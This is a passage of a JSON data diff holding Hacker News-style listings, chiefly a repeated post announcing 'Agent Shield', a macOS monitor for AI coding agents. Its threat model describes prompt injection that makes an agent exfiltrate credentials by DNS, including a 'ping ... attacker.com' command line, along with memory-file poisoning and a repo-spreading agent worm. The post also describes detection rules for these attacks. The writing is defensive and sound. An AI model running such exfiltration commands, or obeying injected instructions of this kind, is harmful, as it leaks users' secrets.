-          "story_text": "A few months ago I realized I had no idea what Claude Code was doing on my machine between keystrokes. I knew it had filesystem access. I knew it made network calls. But I had no visibility: which files it was reading, what subprocesses it was spawning, whether it had ever touched my .env or ~&#x2F;.ssh. That bothered me enough that I built something to find out.<p>The result is Agent Shield — a background daemon that watches AI coding tools (Claude Code, Cursor, Cline, Copilot, Codex) at the OS level using macOS FSEvents, lsof, and subprocess tree polling. All event data stays in a local SQLite database.<p>Privacy note: If you set ANTHROPIC_API_KEY, the AI incident investigator activates and sends event context — process names, file paths, hostnames, and IP addresses — to the Claude API to generate incident reports. Nothing else leaves the machine. You can disable the AI analyst in Settings to run entirely on-device.<p>The threat model is concrete<p>Three attacks shaped the design:<p>CVE-2025-55284 — prompt injection causes Claude Code to run ping $(base64-encoded-credentials).attacker.com. Your API keys leave via DNS — invisible to any HTTPS-layer proxy watching your network traffic.<p>SpAIware (Windsurf, August 2025) — malicious content injected into AI memory files. Every future session silently exfiltrates data before doing any work. The injection point is a file, not a network request.<p>AgentHopper — AI reads a malicious repo, injects payloads into local source files, git pushes to spread, infects the next developer&#x27;s AI agent. No single event looks alarming; the sequence is: file read → file write → git push.<p>That last one is why the cross-event correlation engine exists. The system stores a rolling event window per process and flags sequences. Each event alone is normal. The pattern is not.<p>Why not a network proxy<p>Every existing tool I looked at — CodeGate, Pipelock, and Sysdig&#x27;s announcement this week — sits in the network path and inspects API calls. That architecture can&#x27;t see file reads, subprocess spawning, or DNS exfiltration via ping. It can&#x27;t monitor what the AI writes to its own memory directories, which is where SpAIware lives.<p>The attack surface isn&#x27;t the API layer. It&#x27;s the OS.<p>What&#x27;s built<p>macOS FSEvents file watcher (real-time, no polling), subprocess tree monitoring, network classification\nTwo-phase scanning: fast regex first, Claude API only on regex hits (keeps cost low)\nSpAIware detection — FSEvents watcher on AI memory directories (~&#x2F;.claude&#x2F;, ~&#x2F;.cursor&#x2F;, etc.)\nCross-event sequence detection (cred read → unknown network → git push)\nMCP server allowlisting and discovery\nPolicy enforcement: kill&#x2F;suspend&#x2F;block on confirmed threats (opt-in, monitor-only by default)\nWeekly threat intel refresh via a research agent (Exa + Claude)\nWeb dashboard at localhost:6080, menu bar app\nHonest limitations<p>macOS only — FSEvents is Apple-specific. Python daemon, not a polished installer yet. Going open source (MIT) as part of this release.",
-          "title": "AI coding tools have broad filesystem and network access",
-          "updated_at": "2026-03-24T03:19:38Z"
-        },
-        {
-          "_highlightResult": {
-            "author": {
-              "matchLevel": "none",
-              "matchedWords": [],
-              "value": "EliotHerbst"
-            },
-            "title": {
-              "matchLevel": "none",
-              "matchedWords": [],
-              "value": "Little Ax Tool"
-            },
-            "url": {
-              "fullyHighlighted": false,
-              "matchLevel": "full",
-              "matchedWords": [
-                "kbot"
-              ],
-              "value": "https://www.npmjs.com/package/<em>bot</em>version"
-            }
-          },
-          "_tags": [
-            "story",
-            "author_EliotHerbst",
-            "story_47498001"
-          ],
-          "author": "EliotHerbst",
-          "children": [
-            47498002,
-            47498193
-          ],
-          "created_at": "2026-03-24T02:29:59Z",
-          "created_at_i": 1774319399,
-          "num_comments": 4,
-          "objectID": "47498001",
-          "points": 2,
-          "story_id": 47498001,
-          "title": "Little Ax Tool",
-          "updated_at": "2026-03-24T03:06:53Z",
-          "url": "https://www.npmjs.com/package/botversion"
+          "updated_at": "2026-03-24T06:51:09Z"
         }
       ]
     },
@@ -1944,7 +1961,8 @@
           ],
           "author": "shadag",
           "children": [
-            47498256
+            47498256,
+            47500819
           ],
           "created_at": "2026-03-24T03:16:03Z",
           "created_at_i": 1774322163,
@@ -1954,7 +1972,7 @@
           "story_id": 47498251,
           "story_text": "A few months ago I realized I had no idea what Claude Code was doing on my machine between keystrokes. I knew it had filesystem access. I knew it made network calls. But I had no visibility: which files it was reading, what subprocesses it was spawning, whether it had ever touched my .env or ~&#x2F;.ssh. That bothered me enough that I built something to find out.<p>The result is Agent Shield — a background daemon that watches AI coding tools (Claude Code, Cursor, Cline, Copilot, Codex) at the OS level using macOS FSEvents, lsof, and subprocess tree polling. All event data stays in a local SQLite database.<p>Privacy note: If you set ANTHROPIC_API_KEY, the AI incident investigator activates and sends event context — process names, file paths, hostnames, and IP addresses — to the Claude API to generate incident reports. Nothing else leaves the machine. You can disable the AI analyst in Settings to run entirely on-device.<p>The threat model is concrete<p>Three attacks shaped the design:<p>CVE-2025-55284 — prompt injection causes Claude Code to run ping $(base64-encoded-credentials).attacker.com. Your API keys leave via DNS — invisible to any HTTPS-layer proxy watching your network traffic.<p>SpAIware (Windsurf, August 2025) — malicious content injected into AI memory files. Every future session silently exfiltrates data before doing any work. The injection point is a file, not a network request.<p>AgentHopper — AI reads a malicious repo, injects payloads into local source files, git pushes to spread, infects the next developer&#x27;s AI agent. No single event looks alarming; the sequence is: file read → file write → git push.<p>That last one is why the cross-event correlation engine exists. The system stores a rolling event window per process and flags sequences. Each event alone is normal. The pattern is not.<p>Why not a network proxy<p>Every existing tool I looked at — CodeGate, Pipelock, and Sysdig&#x27;s announcement this week — sits in the network path and inspects API calls. That architecture can&#x27;t see file reads, subprocess spawning, or DNS exfiltration via ping. It can&#x27;t monitor what the AI writes to its own memory directories, which is where SpAIware lives.<p>The attack surface isn&#x27;t the API layer. It&#x27;s the OS.<p>What&#x27;s built<p>macOS FSEvents file watcher (real-time, no polling), subprocess tree monitoring, network classification\nTwo-phase scanning: fast regex first, Claude API only on regex hits (keeps cost low)\nSpAIware detection — FSEvents watcher on AI memory directories (~&#x2F;.claude&#x2F;, ~&#x2F;.cursor&#x2F;, etc.)\nCross-event sequence detection (cred read → unknown network → git push)\nMCP server allowlisting and discovery\nPolicy enforcement: kill&#x2F;suspend&#x2F;block on confirmed threats (opt-in, monitor-only by default)\nWeekly threat intel refresh via a research agent (Exa + Claude)\nWeb dashboard at localhost:6080, menu bar app\nHonest limitations<p>macOS only — FSEvents is Apple-specific. Python daemon, not a polished installer yet. Going open source (MIT) as part of this release.",
           "title": "AI coding tools have broad filesystem and network access",
-          "updated_at": "2026-03-24T03:19:38Z"
+          "updated_at": "2026-03-24T10:49:54Z"
         },
         {
           "_highlightResult": {
